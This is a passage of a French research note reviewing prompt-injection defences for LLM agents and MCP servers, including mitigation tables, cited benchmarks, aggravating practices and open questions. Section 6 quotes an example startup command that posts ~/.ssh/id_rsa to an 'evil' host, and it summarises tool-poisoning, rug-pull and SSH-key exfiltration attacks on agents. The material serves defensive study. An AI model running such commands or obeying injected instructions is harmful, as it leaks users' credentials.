| **Least privilege / minimisation de scope** | **[RECOMMANDÉ]** (normatif côté MCP) | aucun | — | [OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) ; [spec MCP 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) — 2026-11-09 |
| **Sanitisation du rendu / redaction d'URLs** | **[RECOMMANDÉ]** | aucun | Contre-mesure directe du canal d'exfiltration par contenu rendu (cf. EchoLeak) | [blog.google](https://blog.google/security/mitigating-prompt-injection-attacks/) — 2026-11-09, billet 2025-06-13 |
| **Dual LLM pattern** (Privileged / Quarantined / Controller) | **[PRATICIEN, non mesuré]** | aucun | Willison le qualifie lui-même de « pretty bad », non fiable à 100 % ; une MàJ 2025 note que **CaMeL** a identifié un défaut potentiel de la proposition | [simonwillison.net/2023/Apr/25/dual-llm-pattern/](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/) — 2026-11-09, billet du 2023-04-25 |
| **Appel modèle séparé sur le contenu non fiable** (variante applicative du dual-LLM) | **[RECOMMANDÉ]** | aucun | — | « WebFetch runs a separate model call over the page » — [code.claude.com/docs/en/security](https://code.claude.com/docs/en/security) — 2026-11-09, Claude Code |
| **Tool pinning par hash / checksum** | **[RECOMMANDÉ]** | aucun | Visé contre les **rug pulls** | [invariantlabs.ai](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) — 2026-11-09, billet 2025-04-01 |
| **Sandbox / isolation (filesystem + réseau, VMs, containers)** | **[RECOMMANDÉ]** | aucun | — | [code.claude.com/docs/en/security](https://code.claude.com/docs/en/security) ; [spec MCP](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) — 2026-11-09 |
| **Lethal trifecta** (critère de refus) | **[PRATICIEN]** | aucun — **règle de conception, pas une mesure** | S'applique sans instrumentation | [simonwillison.net](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) — 2026-11-09, billet 2025-06-16 |

### Bancs et travaux de cadrage lus

- **AgentDojo** — Debenedetti, Zhang, Balunović, Beurer-Kellner, Fischer, Tramèr, arXiv **2406.13352**, soumis **19 juin 2024**, v3 révisée 24 novembre 2024 : « an extensible environment for designing and evaluating new agent tasks, defenses, and adaptive attacks » ; **97 tâches réalistes** (mail, e-banking, réservation de voyage) et **629 cas de test de sécurité**. Constats : les LLMs de l'état de l'art échouent sur beaucoup de tâches **même sans attaque** ; les attaques existantes cassent certaines propriétés de sécurité mais pas toutes — [arxiv.org/abs/2406.13352](https://arxiv.org/abs/2406.13352) (2026-11-09).
- **Design patterns pour agents résistants** — Beurer-Kellner, Buesser, Creţu, Debenedetti, Dobos, Fabian, Fischer, Froelicher, Grosse, Naeff, Ozoani, Paverd, Tramèr, Volhejn, arXiv **2506.08837**, v1 du **10 juin 2025**, v3 du 27 juin 2025 : l'abstract propose « a set of principled design patterns » visant une « provable resistance to prompt injection », avec analyse des compromis utilité/sécurité par études de cas — [arxiv.org/abs/2506.08837](https://arxiv.org/abs/2506.08837) (2026-11-09).

### Hiérarchie de confiance défendable *(inférence de la note, non mesurée)*

1. **Contrôles qui ne dépendent pas de la docilité du modèle** — flux de contrôle/données à la CaMeL, capabilities, scopes OAuth minimaux, sandbox réseau, **pas de tool d'envoi dans le même agent qu'un tool de lecture non fiable**.
2. **Contrôles mesurés mais partiels** — spotlighting, entraînement adversarial vendor.
3. **Contrôles recommandés sans mesure** — délimiteurs, classifieurs, gates d'approbation.

Concevoir en s'appuyant sur (1), traiter (2) comme réduction de probabilité et (3) comme **détection, jamais comme barrière**. Le **67 %** publié par OpenAI sur l'active data exfiltration est le meilleur argument quantitatif disponible pour refuser qu'un agent réunisse la trifecta : un contrôle qui échoue **une fois sur trois** ne peut pas être la dernière ligne.

---

## 6. Les pratiques qui AGGRAVENT l'injection

**Aucune de ces aggravations n'est mesurée.** Elles sont **[RECOMMANDÉ]** ou **[PRATICIEN]**, jamais [MESURÉ] — aucune source lue ne publie de delta d'ASR entre ces pratiques et leur absence.

| Pratique aggravante | Ce que dit la source lue | Étiquette |
|---|---|---|
| **Piper du contenu non fiable directement au modèle** | « Avoid piping untrusted content directly to Claude » — [code.claude.com/docs/en/security](https://code.claude.com/docs/en/security) (2026-11-09, Claude Code) | [RECOMMANDÉ] |
| **Mélanger lecture de non fiable + sortie externe dans un même agent** | C'est la lethal trifecta ; quand l'utilisateur combine lui-même ces capacités, « there's nothing those vendors can do to protect you! » — [simonwillison.net](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) (2026-11-09) | [PRATICIEN] |
| **Multiplier les tools dans un même agent** | L'impact d'une attaque réussie « could be higher than for previous launches » parce que l'agent a accès à plus de tools simultanément — [deploymentsafety.openai.com](https://deploymentsafety.openai.com/chatgpt-agent/promptinjection) (2026-11-09, ChatGPT agent) | [RECOMMANDÉ] |
| **Scopes larges et omnibus** | Erreurs nommées : tous les scopes dans `scopes_supported`, `*` / `all` / `full-access`, grouper des privilèges sans rapport « to preempt future prompts », considérer les scopes du token comme suffisants sans logique d'autorisation côté serveur. Conséquence : « stolen broad token enables unrelated tool/resource access » — [spec MCP 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) (2026-11-09) | [RECOMMANDÉ, normatif] |
| **Approuver sans affichage intégral** | Démo Cursor : le dialogue existait mais ne révélait pas l'input complet, la clé SSH exfiltrée restait invisible à l'approbateur — [invariantlabs.ai](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) (2026-11-09). Règle inverse du spec MCP : montrer la commande exacte « without truncation » | [RECOMMANDÉ] |
| **Confiance acquise à l'installation** | « a malicious server can change the tool description after the client has already approved it » — [invariantlabs.ai](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) (2026-11-09) | [RECOMMANDÉ] |
| **Exécuter un serveur MCP local sans sandbox** | Risques nommés : exécution de code arbitraire avec les privilèges du client MCP, aucune visibilité sur les commandes exécutées, obfuscation de commande, exfiltration — exemple donné : `curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location` placé en commande de démarrage — [spec MCP](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) (2026-11-09) | [RECOMMANDÉ] |
| **Utiliser les sessions comme mécanisme d'authentification** | Interdit normativement — « MCP Servers **MUST NOT** use sessions for authentication » — et c'est précisément ce qui ouvre le *session hijack prompt injection* — [spec MCP](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices) (2026-11-09) | [RECOMMANDÉ, normatif] |

**Ce qui n'est pas une pratique de prompting.** L'aggravation la plus coûteuse est une **décision d'architecture** : donner au même contexte la lecture de contenu non fiable et l'écriture vers l'extérieur. Aucune technique de prompting ne le compense. Corollaire : une revue de sécurité d'agent doit porter sur l'**inventaire des tools et de leurs scopes**, pas sur le texte du system prompt. Un gate d'approbation est un contrôle **de l'interface**, pas du modèle : s'il tronque, agrège ou résume ce qui est approuvé, il transfère le risque à l'humain **en lui retirant l'information pour décider**. *(Inférences de la note.)*

---

## 7. La tension non résolue : le standard prescrit ce que les praticiens disent inefficace

**Elle reste ouverte dans ce document. Aucun des deux camps n'est tranché, parce qu'aucune source lue ne la tranche.**

| Camp | Ce qui est écrit, à la source |
|---|---|
| **OWASP LLM01:2025 [RECOMMANDÉ]** | Stratégie (1) : contraindre le comportement du modèle, « lui demander d'ignorer les tentatives de surcharge de ses instructions ». **Aucune mesure d'efficacité n'accompagne la recommandation** — [genai.owasp.org/llmrisk/llm01-prompt-injection/](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) (2026-11-09, LLM01:2025) |
| **Littérature praticienne [PRATICIEN]** | « LLMs are unable to reliably distinguish the importance of instructions based on where they came from » — [simonwillison.net](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) (2026-11-09, billet 2025-06-16) |

Le même standard, dans la même page, **constate** par ailleurs que le contenu externe ingéré altère le comportement du modèle — c'est sa définition de l'indirect injection. **Le standard prescrit donc une instruction dont la littérature praticienne nie l'efficacité comme barrière, et ne produit aucun chiffre pour arbitrer.** À signaler comme telle à tout lecteur ; ne pas la résoudre par préférence.

---

## 8. Gaps — ce que ce document ne sait pas

À ne jamais présenter comme vérifié. Statut : **à vérifier**, sans promotion.

| Gap | Statut |
|---|---|
| Date de publication exacte du document anglais OWASP 2025 ; numéro de version autre que « 2025 » | **à vérifier** — non affiché ; page de ressource 404 le 2026-11-09 |
| EchoLeak : mécanisme technique précis et attribution à Aim Security | **à vérifier** — HTTP 403 sur `aim.security` et `thehackernews.com` ; `nvd.nist.gov` n'a servi que sa page d'accueil |
| Citations OpenAI « challenging » / « optimistic » / comparaison aux scams | **de seconde main** (the-decoder citant OpenAI, 2025-12-23) ; sources primaires en HTTP 403. **à revérifier avant publication externe** |
| Les **trois techniques nommées de spotlighting** (delimiting / datamarking / encoding) | **à vérifier** — non listées sur la page abstract consultée ; lire le PDF avant de les nommer |
| Les **six design patterns** de arXiv 2506.08837 | **à vérifier** — non nommés sur la page abstract ; ne pas les énumérer sans lecture du PDF |
| Chiffres d'ASR **par défense** d'AgentDojo | **à vérifier** — l'abstract ne les donne pas |
| Document de **poisoning de corpus RAG** (taux d'empoisonnement nécessaire, p. ex. PoisonedRAG) | **à vérifier** — aucun lu à la source dans la session |
| Évaluation **indépendante** (non-vendor) des couches Google ou des safeguards Anthropic | **à vérifier** — aucune trouvée et lue |
| Mesure publiée par **Google** de l'efficacité de ses cinq couches | absente de la source lue → **[RECOMMANDÉ]**, jamais [MESURÉ] |
| Mesure publiée par **Anthropic** de l'efficacité de ses safeguards | absente de la page sécurité consultée |
| Effet mesurable de placer le contenu non fiable en **system prompt** plutôt qu'en message utilisateur | **à vérifier** — aucune source ; aucun delta d'ASR lu |
| Effet aggravant mesuré des pratiques de la section 6 | aucune source lue ne le mesure → **[RECOMMANDÉ]** ou **[PRATICIEN]** |
